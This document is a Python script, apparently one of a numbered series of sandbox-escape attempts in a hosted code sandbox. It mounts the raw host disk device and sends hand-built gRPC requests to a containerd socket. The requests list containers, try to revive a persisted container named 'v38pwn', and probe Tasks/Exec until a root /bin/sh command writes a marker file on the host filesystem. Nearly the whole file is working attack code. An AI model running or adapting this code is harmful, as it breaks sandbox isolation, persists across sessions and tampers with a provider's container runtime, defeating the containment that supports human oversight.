# -*- coding: utf-8 -*-
"""vda39_persist_check: 持久化验证 + v38pwn 复活 + Exec 二分
P1: Containers/List (v38pwn 跨会话残留?)
P2: Tasks/List (v38pwn task 活着? 跨 sandbox 持久进程!)
P3: cell rootfs markers (.v38_marker / .v33_persist_marker / .v34_exec_marker)
P4: v38pwn task 目录 (init.pid 还在? shim 还活着?)
P5: 复活尝试: Tasks/Create + Start (若记录在但 task 不在)
P6: Exec 字段二分: 空/field1/field1+2/field1+2+3
输出落盘 + 哨兵 V39S_DONE"""
import os, time, socket, ctypes, re, struct, subprocess, json, base64

OUT = '/vercel/sandbox/v39s.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, ctype='application/grpc', t=6, ns='default'):
    try:
        tmp = '/vercel/sandbox/curl_req_%d.bin' % os.getpid()
        hdr = '/vercel/sandbox/curl_hdr_%d.txt' % os.getpid()
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: %s' % ctype, '-H', 'TE: trailers']
        if ns:
            cmd += ['-H', 'containerd-namespace: %s' % ns]
        cmd += ['-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 2)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' | ')[:250]
        except Exception:
            pass
        return 'rc=%d HDR:%s' % (r.returncode, hdrtxt), r.stdout
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pmsg(field_no, payload):
    return pvarint((field_no << 3) | 2) + pvarint(len(payload)) + payload


def pbool(field_no, v):
    return pvarint((field_no << 3)) + (b'\x01' if v else b'\x00')


def show(tag, out, raw=False):
    if not out:
        log('%s -> EMPTY' % tag)
        return
    if raw:
        log('%s -> %s' % (tag, out[:400].decode('utf-8', errors='replace').replace('\n', ' ')))
        return
    strs = re.findall(rb'[\x20-\x7e]{4,}', out)
    log('%s -> %s' % (tag, [s.decode(errors='replace') for s in strs[:20]]))


CSP = '/mnt/vdax/run/containerd/containerd.sock'
TASKDIR38 = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default/v38pwn'


def p1():
    log('=== P1 Containers residue ===')
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/List', grpc_env(b''), t=4)
    log('Containers/List %s' % rc)
    show('Containers body', out)
    if b'v38pwn' in out:
        log('*** V38PWN CONTAINER RECORD PERSISTED ***')
    m = re.search(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}-snapshot', out)
    sk = m.group().decode() if m else None
    log('snap_key=%s' % sk)
    return sk


def p2():
    log('=== P2 Tasks alive ===')
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/List', grpc_env(b''), t=4)
    log('Tasks/List %s' % rc)
    show('Tasks body', out)
    if b'v38pwn' in out:
        log('*** V38PWN TASK STILL ALIVE ACROSS SANDBOX ***')
    return b'v38pwn' in out


def p3():
    log('=== P3 cell rootfs markers ===')
    for mk in ['.v38_marker', '.v33_persist_marker', '.v34_exec_marker', '.v36_exec_marker', '.v37_marker']:
        fp = '/mnt/vdax/root/%s' % mk
        try:
            if os.path.exists(fp):
                log('%s EXISTS: %s' % (mk, open(fp).read().strip()[:80]))
            else:
                log('%s missing' % mk)
        except Exception as e:
            log('%s ERR %s' % (mk, e))


def p4():
    log('=== P4 v38pwn task dir ===')
    try:
        if os.path.isdir(TASKDIR38):
            log('task dir: %s' % sorted(os.listdir(TASKDIR38)))
            fp = os.path.join(TASKDIR38, 'init.pid')
            if os.path.exists(fp):
                pid = open(fp).read().strip()
                log('init.pid: %s' % pid)
                # 检查 pid 是否存活 (通过 /proc 在 sandbox 内只能看自己的, 但 shim 目录存在说明 manage 中)
            else:
                log('init.pid missing (task dead or cleaned)')
        else:
            log('v38pwn task dir GONE')
    except Exception as e:
        log('P4 ERR %s' % e)


def p5():
    log('=== P5 revive attempt ===')
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Create', grpc_env(pstr(1, 'v38pwn')), t=8)
    log('Tasks/Create v38pwn %s' % rc)
    show('CreateTask body', out, raw=True)
    if 'grpc-status: 0' in rc:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(pstr(1, 'v38pwn')), t=8)
        log('Tasks/Start v38pwn %s' % rc)
        show('Start body', out, raw=True)
        # 验证
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/List', grpc_env(b''), t=4)
        if b'v38pwn' in out:
            log('*** V38PWN REVIVED ***')
        try:
            fp = os.path.join(TASKDIR38, 'init.pid')
            if os.path.exists(fp):
                log('new init.pid: %s' % open(fp).read().strip())
        except Exception as e:
            log('pid chk ERR %s' % e)


def p6():
    log('=== P6 Exec bisect ===')
    # 1) 空请求
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Exec', grpc_env(b''), t=4)
    log('Exec empty %s' % rc)
    # 2) 只 field1
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Exec', grpc_env(pstr(1, 'v38pwn')), t=4)
    log('Exec f1 %s' % rc)
    # 3) field1+2
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Exec', grpc_env(pstr(1, 'v38pwn') + pstr(2, 'ex39a')), t=4)
    log('Exec f1+f2 %s' % rc)
    # 4) field1+2+3 (Any spec, Process)
    proc = {"user": {"uid": 0, "gid": 0}, "args": ["/bin/sh", "-c", "echo exec39-ok >> /mnt/root/.v39_exec_marker"],
            "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"], "cwd": "/"}
    proc_json = json.dumps(proc).encode()
    any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, proc_json)
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Exec',
                      grpc_env(pstr(1, 'v38pwn') + pstr(2, 'ex39a') + pmsg(3, any_spec)), t=6)
    log('Exec f1+2+3 %s' % rc)
    show('Exec body', out, raw=True)
    # 5) 全字段
    req = pstr(1, 'v38pwn') + pstr(2, 'ex39b') + pmsg(3, any_spec)
    req += pbool(4, True) + pbool(5, True) + pbool(6, True) + pbool(7, False)
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Exec', grpc_env(req), t=6)
    log('Exec full %s' % rc)
    show('Exec full body', out, raw=True)
    time.sleep(2)
    try:
        fp = '/mnt/vdax/root/.v39_exec_marker'
        log('exec39 marker: %s' % (os.path.exists(fp) and open(fp).read().strip() or 'missing'))
    except Exception as e:
        log('exec39 ERR %s' % e)


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sk = p1()
    alive = p2()
    p3()
    p4()
    if sk and not alive:
        p5()
    p6()

    log('V39S_DONE')
    f.close()


if __name__ == '__main__':
    main()
